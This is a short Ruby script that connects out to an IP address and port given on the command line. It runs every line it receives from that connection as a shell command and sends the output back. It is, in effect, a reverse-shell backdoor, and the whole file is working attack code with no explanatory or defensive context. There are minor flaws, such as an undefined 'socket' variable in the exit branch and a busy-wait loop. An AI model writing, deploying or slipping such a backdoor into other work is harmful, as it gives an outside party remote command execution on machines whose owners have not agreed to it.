require 'socket'

ip = ARGV[0]
port = ARGV[1]
$runningThread = nil
$threadRunning = nil
$socket = TCPSocket.new(ip, port)
$wantsToExit = false

def executeCommand(command)
  puts "COMMAND IST #{command}"
  IO.popen(command) do |pipe|
    while (line = pipe.gets)
      $socket.write(line)
      #Kernel.puts line
    end
  end
end

def convertData(line)
    if line == 'EXIT'
        $wantsToExit = true
        exit
    end
    $runningThread = Thread.new do
      $threadRunning = true
      executeCommand(line)
    end
end

def receiveData
  $thread5 = Thread.new do
    loop do
      while (line = $socket.gets)
        if line.strip && line.strip != ""
          $thread7 = Thread.new do
            convertData(line.strip)
          end
          $thread7.join
        end
      end
    end
  end
end

receiveData

loop do
  if $wantsToExit == true
    Kernel.puts "Exiting..."
    socket.close
    exit
  end
end